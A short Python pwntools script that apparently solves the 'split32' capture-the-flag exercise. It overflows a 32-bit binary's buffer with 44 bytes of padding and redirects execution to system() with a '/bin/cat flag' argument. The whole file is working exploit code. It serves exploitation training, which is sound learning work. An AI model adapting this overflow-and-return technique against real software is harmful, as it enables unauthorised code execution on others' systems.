#!/usr/bin/python

from pwn import *

s = process('./split32')

s.clean()

system_plt = 0x8048430
bin_cat_flag = 0x804a030

payload = 'A' * 44 + p32(system_plt) + p32(0xdeadbeef) + p32(bin_cat_flag) 

s.sendline(payload)

s.interactive()
